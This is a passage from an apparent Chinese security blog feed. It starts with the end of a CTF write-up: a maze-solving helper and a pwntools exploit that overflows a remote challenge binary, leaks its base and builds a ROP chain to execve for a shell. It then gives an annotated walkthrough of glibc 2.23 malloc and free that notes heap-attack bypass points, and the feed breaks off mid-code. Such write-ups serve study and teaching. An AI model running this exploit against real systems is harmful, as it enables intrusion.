answer) &#123; int i, j; int x, y; for(i = 0;i &lt; 1000;i++) &#123; for(j = 0;j &lt; 1000;j++) &#123; if(a[i][j] == 3) &#123; x = i; y = j; &#125; &#125; &#125; dfs(a, answer, x, y);&#125;int main()&#123; char a[1000][1000] = &#123;0&#125;; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); fflush(stdout); fflush(stdin); fflush(stderr); puts("plz input x:"); int x; scanf("%d",&amp;x); int i; int j; for(i = 0;i &lt; x;i++)&#123; for(j = 0;j &lt; x;j++) &#123; int m = 0; scanf("%d", &amp;m); a[i][j] = m; &#125; &#125; char * answer; answer = malloc(0x1000); find(a, answer); printf("your answer\n"); puts(answer); return 0;&#125; exp. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from pwn import *context.aslr = Falser = remote('81.68.174.63', 62176)def getline(): a = r.recvline() return adef change(s,l): b = [] i = 0 while i &lt; l - 1: if s[i] == '\xe2': if s[i + 2] == '\x9b': b.append('0') else: b.append('1') i = i + 3 else: if s[i + 3] == '\xa9' and s[i + 2] == '\x9a': b.append('5') else: b.append('3') i = i + 4 return bdef getmap(x): m = [] a = getline() n = len(a) a = change(a,n) m.append(a) for i in range(x): a = getline() n = len(a) a = change(a,n) m.append(a) return x + 1, mdef pas(): x = 6 l = 0 mm = [] for i in range(100): help = process('csftql') help.recvuntil("plz input x:"); help.sendline(str(x + i)); r.recvline() l, mm = getmap(x + i - 1) for j in range(x + i): for k in range(x + i): help.sendline(mm[j][k]); help.recvuntil("your answer"); answer = help.recvline() answer = help.recvline() r.send(answer) help.close() print "level " + str(i) + " ok!" print answerpas()# gdb.attach(r, "b * 0x743c9 + 0x555555554000")# raw_input()r.sendline('a' * 0x70 + p64(0xc000000030) + p64(8) + p64(0) + 'B' * 0x88 + '\xF0\xD0')r.recvuntil("Your name is : ")leak = u64(r.recv(8)) + 0x555555554000 - 0x55555575aac0print "leak: " + hex(leak) pop_rdi = 0x109d3d + leakpop_rsi_r15 = 0x119c45 + leakpop_rdx_adc_rax = 0x79e6e + leaksyscall = 0x743c9 + leakpop_rax_ret = 0x74e29 + leakpayload = 'a' * 0x70 + p64(0xc000000030) + p64(8) + p64(0) + 'B' * 0x88payload += p64(pop_rdx_adc_rax) + p64(0x8)payload += p64(pop_rsi_r15) + p64(0xc000000030) + p64(0)payload += p64(pop_rdi) + p64(0)payload += p64(pop_rax_ret) + p64(0)payload += p64(syscall)payload += p64(pop_rdx_adc_rax) + p64(0)payload += p64(pop_rsi_r15) + p64(0) + p64(0)payload += p64(pop_rdi) + p64(0xc000000030)payload += p64(pop_rax_ret) + p64(0x3b)payload += p64(syscall)r.sendline(payload)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-RTFSC-Linux-glibc-2.23-malloc与free]]></title>
    <url>%2Fposts%2F1003444e%2F</url>
    <content type="text"><![CDATA[前言 基于glibc-2.23. malloc 首先来看malloc函数的实现,ptmalloc中malloc函数的实现为__libc_malloc. 1234567891011121314151617181920212223242526272829typedef struct malloc_state * mstate;//...void * __libc_malloc (size_t bytes) &#123; mstate ar_ptr; //用于保存指向分配区的指针 void * victim; //用于保存获得的mem指针(chunk_addr+0x10) void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); //用于支持程序员对malloc函数进行hook或者用于进程在创建新线程过程中分配内存. arena_get (ar_ptr, bytes); //获取分配区. victim = _int_malloc (ar_ptr, bytes); //_int_malloc执行真正的分配逻辑. if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; //如果分配失败且获取到了分配区,说明该分配区内存空间不足,获取下一个分配区,再次调用_int_malloc.知道无分配区可以分配. if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); //如果此时分配区指针不为空,释放分配区,这里分配已经结束了. assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); //如果指针不为NULL,指针对应的分配区不对应同时该chunk不是mmap分配的,则报错,因为正常情况不可能出现. return victim; //返回mem指针.&#125; _int_malloc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410static void * _int_malloc (mstate av, size_t bytes) &#123; INTERNAL_SIZE_T nb; /* 请求的chunk_size */ unsigned int idx; /* 对应bin数组中的index */ mbinptr bin; /* 指向对应bin的指针 */ mchunkptr victim; /* 指向分配的chunk */ INTERNAL_SIZE_T size; /* 分配的chunk的size */ int victim_index; /* 分配的chunk的bin的index */ mchunkptr remainder; /* 指向分割后剩下的那块chunk */ unsigned long remainder_size; /* 分割后剩下的那块chunk的size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* 一个block值 */ mchunkptr fwd; /* 用于链表操作 */ mchunkptr bck; /* 用于链表操作 */ const char *errstr = NULL; checked_request2size (bytes, nb); /* 计算chunk_size */ /* 无可用的分配区,使用sysmalloc获取内存 */ if (__glibc_unlikely (av == NULL)) &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); //对数据用memset进行处理 return p; &#125; /* 所需的chunk大小小于等于fast bins中的最大chunk大小,首先尝试从fast bins中分配chunk.即使分配区未初始化也是安全的. */ if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; //#define get_max_fast() global_max_fast //要分配的chunk size小于global_max_fast则先从fastbins种寻找 idx = fastbin_index (nb); //通过size获取在fastbins种对应的index mfastbinptr *fb = &amp;fastbin (av, idx); //通过size获取在fastbins种对应的bin mchunkptr pp = *fb; //获取bin的首个chunk do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim); /* 将头指针的下一个chunk作为空闲chunk链表的头部,这里使用lock-free的技术实现.Lock-free算法的基础是CAS(Compareand-Swap)原子操作.避免了ABA问题 */ //此时victim是该fb原来的首个chunk,或者为0 if (victim != 0) &#123; if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) &#123; /* index检测,检测该chunk的size是否符合该bin的index,fastbin attack最大的限制就是该判断,通常通过伪造size或寻找偏移绕过 */ errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; &#125; check_remalloced_chunk (av, victim, nb); /* #if !MALLOC_DEBUG # define check_chunk(A, P) # define check_free_chunk(A, P) # define check_inuse_chunk(A, P) # define check_remalloced_chunk(A, P, N) # define check_malloced_chunk(A, P, N) # define check_malloc_state(A) 非debug模式下这些宏定义为空 */ void *p = chunk2mem (victim); //将chunk指针转化为mem指针,即指向data区域返回给用户使用 alloc_perturb (p, bytes); /* # define __glibc_unlikely(cond) (cond) static int perturb_byte; static void alloc_perturb (char *p, size_t n) &#123; if (__glibc_unlikely (perturb_byte)) memset (p, perturb_byte ^ 0xff, n); &#125; 该函数配合calloc使用 */ return p; //将分配出来的mem指针返回 &#125; //victim为0说明对应fastbin无空闲chunk,继续进行分配 &#125; /* 所需的chunk大小属于small bin */ if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); /* 根据index获得某个small bin的空闲chunk双向循环链表表头 */ if ((victim = last (bin)) != bin) &#123; /* 将表尾赋值给victim,如果victim也就是表尾与表头相同,表示该bin为空 */ if (victim == 0) /* victim为0,表示small bin还没有初始化为双向循环链表,调用malloc_consolidate()函数,此时由于global_max_fast也未初始化,所以会调用malloc_init_state初始化 */ malloc_consolidate (av); else &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) &#123; /* 双向链表检测,house_of_lore中需要绕过该检测 */ errstr = "malloc(): smallbin double linked list corrupted"; goto errout; &#125; set_inuse_bit_at_offset (victim, nb); //设置victim chunk的inuse标志,该标志处于victim chunk的下一个相邻chunk的size字段的第一个bit. bin-&gt;bk = bck; bck-&gt;fd = bin; /* 将victim从small bin的双向循环链表中取出,从small bin中取出一个chunk也可以用unlink()宏函数 */ if (av != &amp;main_arena) /* 如果是非主分配区,将victim chunk的size字段中的表示非主分配区的标志bit清零 */ victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //同上,正常的分配流程 &#125; &#125; &#125; else &#123; /* 所需的chunk属于large bins,根据chunk的大小获得对应的large bin的index */ idx = largebin_index (nb); if (have_fastchunks (av)) /* 当前分配区的fast bins中存在chunk则调用malloc_consolidate()函数合并fast bins中的chunk,并将这些空闲chunk加入unsorted bin中 */ malloc_consolidate (av); &#125; for (;;) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; /* 反向遍历unsorted bin的双向循环链表,遍历结束的条件是循环链表中只剩下一个头结点. */ bck = victim-&gt;bk; /* 此时bck是unsorted bin链表中最后一个chunk的前一个chunk,也就是倒数第二个chunk */ if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) /* 检查最后一个chunk是否合法,chunk的大小不能小于等于2 * SIZE_SZ,也不能超过该分配区总的内存分配量.在unsorted bin中的空闲chunk的所有标志位都清零了 */ malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av); size = chunksize (victim); /* 获取最后一个chunk的size */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* 用户请求的chunk大小为small bin范围,unsorted bin中只有一个last remainder chunk(即倒数第二个chunk为bin表头),大小大于所需chunk的大小加上MINSIZE */ remainder_size = size - nb; //计算切分后剩余chunk的size remainder = chunk_at_offset (victim, nb); //计算切分后剩余chunk的地址 unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); /* 将剩余chunk加入unsorted bin的链表中并将其作为分配区的last remainder chunk,此时unsorted bin中只有一个chunk */ if (!in_smallbin_range (remainder_size)) &#123; /* 若剩下的chunk属于large bin chunk,将该chunk的fd_nextsize和bk_nextsize设置为NULL */ remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); //设置头部(addr + 0x8),包括大小和标志位,由于临近的前一个chunk一定位于使用中,所以PREV_INUSE为1 set_head (remainder, remainder_size | PREV_INUSE); //同理,由于victim会被分配给用户,所以PREV_INUSE为1 set_foot (remainder, remainder_size); //该chunk不在使用中,使用set_foot对该chunk的inuse标志位置零 check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //同上,正常的分配流程 &#125; unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* 不满足上述情况则将该chunk从unsorted bin链表中取出 */ if (size == nb) &#123; /* victim与所需的chunk大小一致 */ set_inuse_bit_at_offset (victim, size); //对victim的inuse标志位置零 if (av != &amp;main_arena) //不属于主分配区则对对应的标志位置零 victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //同上,正常的分配流程 &#125; //到这说明victim不会被分配了,而是会放入对应的bin链表 if (in_smallbin_range (size)) &#123; /* victim属于small bins */ victim_index = smallbin_index (size); //获得所属small bin的index bck = bin_at (av, victim_index); //将该small bin的链表表头赋值给bck fwd = bck-&gt;fd; //该small bin第一个chunk赋值给fwd //victim会插入到bck和fwd之间,作为该small bin链表的第一个chunk. &#125; else &#123; /* victim属于large bins */ victim_index = largebin_index (size); //获得所属large bin的index bck = bin_at (av, victim_index); //将该large bin的链表表头赋值给bck fwd = bck-&gt;fd; //该large bin第一个chunk赋值给fwd if (fwd != bck) &#123; /* fwd不等于bck意味着该large bin中有空闲chunk存在 */ size |= PREV_INUSE; /* 将当前chunk的size的inuse标志bit置位,相当于加1,便于加快chunk大小的比较 */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); /* 断言在该large bin最后一个chunk的size字段中的非主分配区的标志bit没有置位 */ if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123; /* 当前chunk比large bin的最后一个chunk的大小还小,那么当前chunk就插入到large bin的链表的最后. */ fwd = bck; //fwd赋值为表头 bck = bck-&gt;bk; //bck赋值为最后一个chunk victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //chunk size列表是将不同大小的第一个chunk连起来,将victim插入该链表的尾部,该链表是从大到小排列的 &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); /* 断言在该large bin第一个chunk的size字段中的非主分配区的标志bit没有置位 */ while ((unsigned long) size &lt; fwd-&gt;size) &#123; /* 正向遍历chunk size链表,直到找到第一个小于大于等于当前chunk大小的chunk */ fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* 则同一大小的chunk已经存在,则不需要修改chunk size链表,当前chunk插入fwd之后 */ fwd = fwd-&gt;fd; else &#123; /* 当前chunk的大小大于fwd的大小,则将当前chunk作为该chunk size的代表加入chunk size链表,位置为fwd的前面 */ victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else /* 如果large bin链表中没有chunk,直接将当前chunk加入chunk size链表,chunk size链表表头位于第一个chunk的fd_nextsize和bk_nextsize,所以第一个chunk是最大的 */ victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); //将对应map里该index对应的标志位置1 victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; /* 将当前chunk插入到对应bin中 */#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) /* 如果unsorted bin中的chunk超过了10000个,最多遍历10000个就退出,避免长时间处理unsorted bin影响内存分配的效率 */ break; &#125; //此时unsorted bin链表已经清空 if (!in_smallbin_range (nb)) &#123; /* 所需分配的chunk为large bin chunk */ bin = bin_at (av, idx); //获取对应的bin if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) &#123; /* 如果large bin链表不为空且链表中最大的chunk能满足要求,则遍历该large bin链表,找到合适的chunk. */ victim = victim-&gt;bk_nextsize; //从最后一个也就是最小一个开始遍历 while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) /* 反向遍历chunk size链表,直到找到第一个大于等于所需chunk大小的chunk退出循环 */ victim = victim-&gt;bk_nextsize; if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) /* 如果victim不是链表中的最后一个chunk且与victim大小相同的chunk不止一个,意味着victim为chunk size链表中的节点,取victim-&gt;fd节点对应的chunk作为候选chunk */ victim = victim-&gt;fd; remainder_size = size - nb; //由于size可能大于所需的chunk,所以要计算看是否要划分 unlink (av, victim, bck, fwd); /* 调用unlink()宏函数将victim从large bin链表中取出 */ if (remainder_size &lt; MINSIZE) &#123; /* 如果将victim切分后剩余大小小于MINSIZE,则将整个victim返回,实际分配的chunk比所需的chunk要大一些 */ set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; else &#123; /* 从victim中切分出所需的chunk,剩余部分作为一个新的chunk加入到unsorted bin,其他处理与前面类似 */ remainder = chunk_at_offset (victim, nb); //计算剩余chunk的地址 bck = unsorted_chunks (av); //获取unsorted bin的表头 fwd = bck-&gt;fd; //赋值fwd为第一个chunk if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; //验证第一个chunk的bk errstr = "malloc(): corrupted unsorted chunks"; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; //将remainder插入为unsorted bin的第一个chunk if (!in_smallbin_range (remainder_size)) &#123; /* 若剩下的chunk属于large bin chunk,将该chunk的fd_nextsize和bk_nextsize设置为NULL */ remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); //划分后设置,同上 &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //返回chunk过程,同上 &#125; &#125; /* 从最合适的small bin或large bin中都没有分配到需要的chunk,则查看比当前bin的index大的small bin或large bin是否有空闲chunk可利用来分配所需的chunk */ ++idx; bin = bin_at (av, idx); //获取下一个相邻bin的空闲chunk链表 block = idx2block (idx); map = av-&gt;binmap[block]; bit = idx2bit (idx); //获取该bin对于binmap中的bit位的值,使用binmap可以加快查找bin是否包含空闲chunk,idx2bit()宏将idx指定的位设置为1,其它位清零 for (;; ) &#123; if (bit &gt; map || bit == 0) &#123; /* map为0即该block所对应的所有bins中都没有空闲chunk.于是遍历binmap的下一个block,直到找到一个不为0的block或者遍历完所有的block */ do &#123; if (++block &gt;= BINMAPSIZE) /* 遍历完所有的block都没有则使用top chunk分配 */ goto use_top; &#125; while ((map = av-&gt;binmap[block]) == 0); bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; &#125; while ((bit &amp; map) == 0) &#123; /* 在一个block遍历对应的bin直到找到一个bit不为0退出遍历 */ bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); &#125; victim = last (bin); /* 将bin链表中的最后一个chunk赋值为victim */ if (victim == bin) &#123; /* victim与bin链表头指针相同,表示该bin中没有空闲chunk,binmap中的相应位设置不准确,将binmap的相应bit位清零,获取当前bin下一个bin,将bit移到下一个bit位,即乘以2 */ av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; &#125; else &#123; /* 当前bin中的最后一个chunk满足要求,获取该chunk的大小,计算切分出所需chunk后剩余部分的大小,然后将victim从bin的链表中取出 */ size = chunksize (victim); assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; unlink (av, victim, bck, fwd); if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; else &#123; remainder = chunk_at_offset (victim, nb); bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = "malloc(): corrupted unsorted chunks 2"; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (in_smallbin_range (nb)) /* 剩余部分chunk属于small bins,将分配区的last remainder chunk设置为剩余部分构成的chunk */ av-&gt;last_remainder = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; use_top: /* 如果从所有的bins中都没有获得所需的chunk,可能的情况为bins中没有空闲chunk或者所需的chunk大小很大,下一步将尝试从top chunk中分配所需chunk */ victim = av-&gt;top; size = chunksize (victim); /* 将当前分配区的top chunk赋值给victim,并获得victim的大小 */ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; /* top chunk切分出所需chunk后还需要MINSIZE的空间来作为fencepost,必须满足top chunk的大小大于所需chunk的大小加上MINSIZE */ /* 切分处理跟前面类似,不同的是原top chunk切分后的剩余部分将作为新的top chunk,原top chunk的fencepost仍然作为新的top chunk的fencepost,所以切分之后剩余的chunk不用set_foot */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; else if (have_fastchunks (av)) &#123; /* 如果top chunk也不能满足要求,查看fast bins中是否有空闲chunk存在,因为free属于fast bins的chunk时不需要获得分配区的锁,调用malloc_consolidate()函数并重新设置当前bin的index,再次循环 */ malloc_consolidate (av); if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; else &#123; /* 向系统申请内存 */ void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; &#125;&#125; malloc_consolidate 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788static void malloc_consolidate(mstate av) &#123; mfastbinptr* fb; /* current fastbin being consolidated */ mfastbinptr* maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; mchunkptr bck; mchunkptr fwd; if (get_max_fast () != 0) &#123; /* 如果全局变量global_max_fast不为零,表示ptmalloc已经初始化,清除分配区flag中fast bin的标志位 */ clear_fastchunks(av); unsorted_bin = unsorted_chunks(av); maxfb = &amp;fastbin (av, NFASTBINS - 1); fb = &amp;fastbin (av, 0); /* 将分配区最大的一个fast bin赋值给maxfb,第一个fast bin赋值给fb,然后遍历fast bins */ do &#123; p = atomic_exchange_acq (fb, 0); /* 获取当前遍历的fast bin中空闲chunk单向链表的头指针 */ if (p != 0) &#123; do &#123; check_inuse_chunk(av, p); nextp = p-&gt;fd; size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); /* 获得当前chunk的size并去除size中的PREV_INUSE和NON_MAIN_ARENA标志,获取相邻的下一个chunk和下一个chunk的大小 */ if (!prev_inuse(p)) &#123; /* 如果当前chunk的前一个chunk空闲则将当前chunk与前一个chunk合并成一个空闲chunk */ prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; if (nextchunk != av-&gt;top) &#123; /* 如果与当前chunk相邻的下一个chunk不是分配区的top chunk,查看与当前chunk相邻的下一个chunk是否处于inuse状态 */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; /* 下一个chunk空闲则将当前chunk与下一个chunk合并成一个空闲chunk */ size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else /* 与当前chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态 */ clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; /* 将合并后的chunk加入unsorted bin的双向循环链表中 */ if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; else &#123; /* 当前chunk的下一个chunk为top chunk则将当前chunk合并入top chunk */ size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); /* 直到遍历完当前fast bin中的所有空闲chunk */ &#125; &#125; while (fb++ != maxfb); /* 直到遍历完所有的fast bins */ &#125; else &#123; /* 如果ptmalloc没有初始化,初始化ptmalloc */ malloc_init_state(av); check_malloc_state(av); &#125;&#125; free ptmalloc中free函数实现为__libc_free. 123456789101112131415161718192021222324252627void __libc_free (void *mem) &#123; mstate ar_ptr; mchunkptr p; void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) &#123; (*hook)(mem, RETURN_ADDRESS (0)); return; &#125; if (mem == 0) return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) &#123; /* 如果当前free的chunk是通过mmap()分配的,调用munmap_chunk()函数munmap本chunk */ if (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123; /* 如果开启了mmap分配阈值动态调整机制且chunk的大小大于设置的mmap分配阈值,小于mmap分配阈值的最大值.则将当前chunk的大小赋值给mmap分配阈值,并修改mmap收缩阈值为mmap分配阈值的2倍 */ mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); /* 不需要对分配区加锁,调用_int_free()函数执行实际的释放工作 */&#125; _int_free 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181static void _int_free (mstate av, mchunkptr p, int have_lock) &#123; INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ const char *errstr = NULL; int locked = 0; size = chunksize (p); if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) &#123; /* chunk的指针地址不能溢出 */ errstr = "free(): invalid pointer"; errout: if (!have_lock &amp;&amp; locked) (void) mutex_unlock (&amp;av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; &#125; if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123; /* chunk的大小必须大于等于MINSIZE且对齐 */ errstr = "free(): invalid size"; goto errout; &#125; check_inuse_chunk(av, p); if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) &#123; /* 当前free的chunk属于fast bins */ if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) &#123; /* 查看下一个相邻的chunk的大小是否小于等于2*SIZE_SZ，下一个相邻chunk的大小是否大于分配区所分配的内存总量 */ if (have_lock || (&#123; assert (locked == 0); mutex_lock(&amp;av-&gt;mutex); locked = 1; chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123; /* 读取分配区所分配的内存总量需要对分配区加锁,检查完以后,释放分配区的锁 */ errstr = "free(): invalid next size (fast)"; goto errout; &#125; if (! have_lock) &#123; (void)mutex_unlock(&amp;av-&gt;mutex); locked = 0; &#125; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* 设置当前分配区的fast bin flag,表示当前分配区的fast bins中已有空闲chunk.然后根据当前free的chunk大小获取所属的fast bin */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do &#123; if (__builtin_expect (old == p, 0)) &#123; /* fast bin double free 检测 */ errstr = "double free or corruption (fasttop)"; goto errout; &#125; if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; &#125; while ((old = 